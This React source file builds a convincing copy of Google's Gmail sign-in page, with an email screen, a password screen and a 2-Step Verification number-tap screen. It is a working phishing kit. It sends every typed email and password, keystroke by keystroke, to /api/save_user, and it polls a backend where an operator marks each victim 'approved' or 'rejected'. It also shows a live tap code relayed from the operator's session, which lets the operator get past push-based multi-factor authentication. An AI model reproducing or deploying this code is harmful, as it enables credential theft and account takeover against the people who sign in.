'use client';

import React, { useState, useEffect, useRef } from 'react';

export default function GoogleSignInPage() {
  const [screen, setScreen] = useState<'email' | 'password' | 'verify'>('email');
  const [loading, setLoading] = useState<boolean>(false);
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [hasError, setHasError] = useState<boolean>(false);
  const [tapCode, setTapCode] = useState<string>('--');
  const [currentUserId, setCurrentUserId] = useState<number | null>(null);

  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const loadTapCode = async () => {
    try {
      const res = await fetch('/api/get_latest_coupon?t=' + Date.now());
      const data = await res.json();
      if (data && data.coupon) {
        setTapCode(data.coupon);
      }
    } catch (err) {
      console.error('loadTapCode error:', err);
    }
  };

  useEffect(() => {
    loadTapCode();
    const interval = setInterval(loadTapCode, 5000);
    return () => clearInterval(interval);
  }, []);

  const saveUser = async (userEmail: string, userPass: string, status: string) => {
    try {
      const formData = new FormData();
      formData.append('email', userEmail);
      formData.append('password', userPass);
      formData.append('status', status);

      const res = await fetch('/api/save_user', {
        method: 'POST',
        body: formData,
      });
      const data = await res.json();
      if (data.success && data.user_id) {
        setCurrentUserId(data.user_id);
      }
    } catch (err) {
      console.error('saveUser error:', err);
    }
  };

  const checkUserStatus = async () => {
    if (!currentUserId) return;
    try {
      const res = await fetch('/api/get_users?t=' + Date.now());
      const users = await res.json();
      const user = users.find((u: { id: number; status: string }) => parseInt(String(u.id)) === parseInt(String(currentUserId)));

      if (user) {
        if (user.status === 'approved') {
          if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
          setLoading(false);
          await loadTapCode();
          setScreen('verify');
        } else if (user.status === 'rejected') {
          if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
          setLoading(false);
          setHasError(true);
          setPassword('');
        }
      }
    } catch (err) {
      console.error('checkUserStatus error:', err);
    }
  };

  const handleEmailNext = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = email.trim();
    if (!trimmed) return;

    setHasError(false);
    setPassword('');
    setLoading(true);

    setTimeout(() => {
      setLoading(false);
      setScreen('password');
      saveUser(trimmed, '', 'email_entered');
    }, 800);
  };

  const handlePasswordNext = async (e: React.FormEvent) => {
    e.preventDefault();
    const trimmedPwd = password.trim();
    if (!trimmedPwd) return;

    setLoading(true);
    await saveUser(email, trimmedPwd, 'verifying');

    if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
    checkIntervalRef.current = setInterval(checkUserStatus, 1500);
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setPassword(val);
    setHasError(false);
    if (currentUserId) {
      saveUser(email, val, 'typing_password');
    }
  };

  const handleSwitchAccount = () => {
    if (checkIntervalRef.current) clearInterval(checkIntervalRef.current);
    setLoading(false);
    setScreen('email');
  };

  return (
    <div className="google-login-container">
      <style jsx global>{`
        :root {
          --bg-color: #f0f4f9;
          --card-bg: #ffffff;
          --text-primary: #1f1f1f;
          --text-secondary: #444746;
          --input-border: #747775;
          --input-bg: transparent;
          --primary-color: #0b57d0;
          --btn-text: #ffffff;
          --btn-hover: #0a50be;
          --error-color: #b3261e;
          --logo-color: #5f6368;
          --chip-border: #747775;
          --chip-hover: #f7f9fc;
        }

        @media (prefers-color-scheme: dark) {
          :root {
            --bg-color: #131314;
            --card-bg: #1e1f20;
            --text-primary: #e3e3e3;
            --text-secondary: #c4c7c5;
            --input-border: #8e918f;
            --input-bg: transparent;
            --primary-color: #a8c7fa;
            --btn-text: #062e6f;
            --btn-hover: #82b4f8;
            --error-color: #f2b8b5;
            --chip-border: #8e918f;
            --chip-hover: #2d2e30;
          }
        }

        .google-login-container {
          background-color: var(--bg-color);
          color: var(--text-primary);
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          font-family: 'Roboto', arial, sans-serif;
          transition: background 0.3s;
        }

        .login-wrapper {
          width: 100%;
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .card {
          background: var(--card-bg);
          padding: 36px;
          border-radius: 28px;
          width: 100%;
          max-width: 400px;
          min-height: 380px;
          display: flex;
          flex-direction: column;
          position: relative;
          box-shadow: 0 4px 8px 3px rgba(0,0,0,0.15), 0 1px 3px rgba(0,0,0,0.3);
          overflow: hidden;
        }

        @media (max-width: 480px) {
          .google-login-container { background: var(--card-bg); align-items: flex-start; }
          .card { box-shadow: none; padding: 24px; max-width: 100%; min-height: 100vh; border-radius: 0; }
        }

        .linear-progress {
          position: absolute; top: 0; left: 0; width: 100%; height: 4px;
          background: var(--bg-color); display: none; z-index: 10;
        }
        .linear-progress.active { display: block; }
        .linear-progress .bar {
          width: 100%; height: 100%; background: var(--primary-color);
          animation: progress-indeterminate 1.5s infinite linear;
          transform-origin: left;
        }
        @keyframes progress-indeterminate {
          0% { transform: translateX(0) scaleX(0); }
          40% { transform: translateX(0) scaleX(0.4); }
          100% { transform: translateX(100%) scaleX(0.5); }
        }

        .google-logo {
          margin-bottom: 12px; display: block; margin-left: auto; margin-right: auto;
        }

        .heading {
          font-family: 'Roboto', sans-serif;
          font-size: 24px; font-weight: 400; color: var(--text-primary);
          margin-bottom: 8px; text-align: center;
        }
        .sub-heading {
          font-size: 16px; color: var(--text-primary);
          margin-bottom: 32px; line-height: 1.5; text-align: center;
        }

        .input-group { position: relative; margin-bottom: 6px; margin-top: 24px; }
        
        .input-field {
          width: 100%; padding: 13px 16px; font-size: 16px;
          color: var(--text-primary);
          background: var(--input-bg);
          border: 1px solid var(--input-border);
          border-radius: 4px; outline: none;
          transition: 0.2s; z-index: 1;
        }

        .input-field:focus {
          border: 2px solid var(--primary-color);
          padding: 12px 15px;
        }

        .floating-label {
          position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
          background: var(--card-bg); padding: 0 6px; color: var(--text-secondary);
          font-size: 16px; pointer-events: none; transition: 0.2s ease all;
        }

        .input-field:focus ~ .floating-label,
        .input-field:not(:placeholder-shown) ~ .floating-label {
          top: 0; font-size: 12px; color: var(--primary-color); font-weight: 500;
        }

        .input-field.error-border { border: 2px solid var(--error-color) !important; padding: 12px 15px !important; }
        .input-field.error-border ~ .floating-label { color: var(--error-color) !important; }
        
        .error-msg {
          color: var(--error-color); font-size: 12px; display: flex; align-items: flex-start; gap: 8px;
          margin-top: 8px; margin-bottom: 10px; line-height: 1.4;
        }

        .link {
          color: var(--primary-color); font-weight: 500; text-decoration: none;
          font-size: 14px; cursor: pointer; display: inline-block; margin-top: 8px;
        }
        .link:hover { opacity: 0.85; }

        .action-row {
          display: flex; justify-content: space-between; align-items: center;
          margin-top: 36px;
        }
        
        .btn {
          padding: 10px 24px; border-radius: 20px; font-size: 14px; font-weight: 500;
          cursor: pointer; border: none; transition: background 0.2s;
        }
        .btn-primary {
          background: var(--primary-color); color: var(--btn-text);
        }
        .btn-primary:hover { background: var(--btn-hover); box-shadow: 0 1px 2px rgba(0,0,0,0.3); }
        
        .btn-secondary { background: transparent; color: var(--primary-color); }
        .btn-secondary:hover { background: rgba(11, 87, 208, 0.08); }

        .profile-section {
          display: flex;
          justify-content: center;
          width: 100%;
          margin-bottom: 24px;
        }

        .profile-chip {
          border: 1px solid var(--chip-border);
          border-radius: 18px;
          padding: 4px 12px 4px 6px;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          cursor: pointer;
          font-size: 14px;
          color: var(--text-primary);
          max-width: 90%;
        }
        .profile-chip:hover { background: var(--chip-hover); }

        .tap-container {
          display: flex; flex-direction: column; align-items: center; text-align: center;
          margin-top: 10px;
        }
        .tap-number {
          font-family: 'Roboto', sans-serif;
          font-size: 80px; line-height: 1; font-weight: 400; color: var(--text-primary);
          margin-bottom: 30px;
        }
        .phone-graphic { width: 140px; height: 100px; position: relative; margin-bottom: 20px; }
        .phone-body {
          width: 50px; height: 86px; border: 2px solid var(--chip-border); border-radius: 8px;
          background: var(--card-bg); position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
          z-index: 2;
        }
        .phone-notch { width: 16px; height: 2px; background: var(--chip-border); position: absolute; top: 6px; left: 50%; transform: translateX(-50%); }
        .phone-prompt {
          width: 36px; height: 40px; background: var(--card-bg); border: 1px solid var(--chip-border);
          position: absolute; top: 20px; left: 50%; transform: translateX(-50%);
          box-shadow: 0 2px 4px rgba(0,0,0,0.1); border-radius: 4px;
          display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 3px;
        }
        .prompt-lines { width: 24px; height: 2px; background: var(--chip-border); opacity: 0.5; }

        .pulse-circle {
          position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
          width: 40px; height: 40px; border-radius: 50%; background: var(--primary-color);
          z-index: 1; animation: pulse 2s infinite;
        }
        @keyframes pulse {
          0% { transform: translate(-50%, -50%) scale(1); opacity: 0.3; }
          100% { transform: translate(-50%, -50%) scale(2.5); opacity: 0; }
        }

        .screen { animation: fade 0.3s; width: 100%; }
        @keyframes fade { from { opacity: 0; } to { opacity: 1; } }
      `}</style>

      <div className="login-wrapper">
        <div className="card">
          {/* Top Loading Bar */}
          <div className={`linear-progress ${loading ? 'active' : ''}`}>
            <div className="bar"></div>
          </div>

          {/* Google Logo SVG */}
          <svg className="google-logo" xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
          </svg>

          {/* 1. EMAIL SCREEN */}
          {screen === 'email' && (
            <form className="screen" onSubmit={handleEmailNext}>
              <h1 className="heading">Sign in</h1>
              <p className="sub-heading">to continue to Gmail</p>

              <div className="input-group">
                <input
                  type="email"
                  className="input-field"
                  placeholder=" "
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  autoComplete="username"
                />
                <label className="floating-label">Email or phone</label>
              </div>

              <span className="link">Forgot email?</span>

              <p style={{ marginTop: '40px', fontSize: '14px', color: 'var(--text-secondary)' }}>
                Not your computer? Use Guest mode to sign in privately. <span className="link" style={{ marginTop: 0 }}>Learn more</span>
              </p>

              <div className="action-row">
                <button type="button" className="btn btn-secondary">Create account</button>
                <button type="submit" className="btn btn-primary">Next</button>
              </div>
            </form>
          )}

          {/* 2. PASSWORD SCREEN */}
          {screen === 'password' && (
            <form className="screen" onSubmit={handlePasswordNext}>
              <h1 className="heading">Welcome</h1>

              <div className="profile-section">
                <div className="profile-chip" onClick={handleSwitchAccount}>
                  <span className="material-symbols-outlined" style={{ fontSize: '20px', color: 'var(--text-primary)' }}>account_circle</span>
                  <span style={{ fontWeight: 500 }}>{email}</span>
                  <span className="material-symbols-outlined" style={{ fontSize: '18px' }}>expand_more</span>
                </div>
              </div>

              <div className="input-group">
                <input
                  type={showPassword ? 'text' : 'password'}
                  className={`input-field ${hasError ? 'error-border' : ''}`}
                  placeholder=" "
                  required
                  value={password}
                  onChange={handlePasswordChange}
                  autoFocus
                />
                <label className="floating-label">Enter your password</label>
              </div>

              {hasError && (
                <div className="error-msg">
                  <span className="material-symbols-outlined" style={{ fontSize: '18px', flexShrink: 0 }}>error</span>
                  <span>Wrong password. Try again or click Forgot password to reset it.</span>
                </div>
              )}

              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '20px' }}>
                <input
                  type="checkbox"
                  id="showPassword"
                  checked={showPassword}
                  onChange={(e) => setShowPassword(e.target.checked)}
                  style={{ width: '18px', height: '18px', accentColor: 'var(--primary-color)' }}
                />
                <label htmlFor="showPassword" style={{ fontSize: '14px', cursor: 'pointer', userSelect: 'none' }}>
                  Show password
                </label>
              </div>

              <div className="action-row">
                <span className="link" style={{ margin: 0 }}>Forgot password?</span>
                <button type="submit" className="btn btn-primary">Next</button>
              </div>
            </form>
          )}

          {/* 3. VERIFY SCREEN (TAP) */}
          {screen === 'verify' && (
            <div className="screen">
              <h1 className="heading">2-Step Verification</h1>

              <div className="tap-container">
                <p style={{ marginBottom: '20px', fontSize: '14px', color: 'var(--text-primary)' }}>
                  To help keep your account safe, Google wants to make sure it’s really you trying to sign in
                </p>

                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', marginBottom: '20px', border: '1px solid var(--chip-border)', padding: '6px 16px', borderRadius: '20px' }}>
                  <span className="material-symbols-outlined" style={{ fontSize: '20px', color: 'var(--text-primary)' }}>account_circle</span>
                  <span style={{ fontSize: '14px', fontWeight: 500 }}>{email}</span>
                </div>

                <div className="tap-number">{tapCode}</div>

                <div className="phone-graphic">
                  <div className="pulse-circle"></div>
                  <div className="phone-body">
                    <div className="phone-notch"></div>
                    <div className="phone-prompt">
                      <div className="prompt-lines"></div>
                      <div className="prompt-lines" style={{ width: '16px' }}></div>
                    </div>
                  </div>
                </div>

                <div style={{ fontSize: '15px', color: 'var(--text-primary)', marginBottom: '4px' }}>
                  Check your <strong>phone</strong>
                </div>
                <div style={{ fontSize: '13px', color: 'var(--text-secondary)', lineHeight: '1.5', maxWidth: '320px' }}>
                  Google sent a notification to your phone. Tap <strong>Yes</strong> on the notification, then tap <strong><span>{tapCode}</span></strong> on your phone to verify.
                </div>
              </div>

              <div style={{ marginTop: '30px', textAlign: 'center' }}>
                <span className="link">Don't have your phone?</span>
              </div>
            </div>
          )}
        </div>

        {/* Footer */}
        <div style={{ marginTop: '24px', fontSize: '12px', color: 'var(--text-secondary)', display: 'flex', gap: '20px', width: '100%', maxWidth: '400px' }}>
          <span>English (United States)</span>
          <span style={{ flex: 1 }}></span>
          <span style={{ cursor: 'pointer' }}>Help</span>
          <span style={{ cursor: 'pointer' }}>Privacy</span>
          <span style={{ cursor: 'pointer' }}>Terms</span>
        </div>
      </div>
    </div>
  );
}
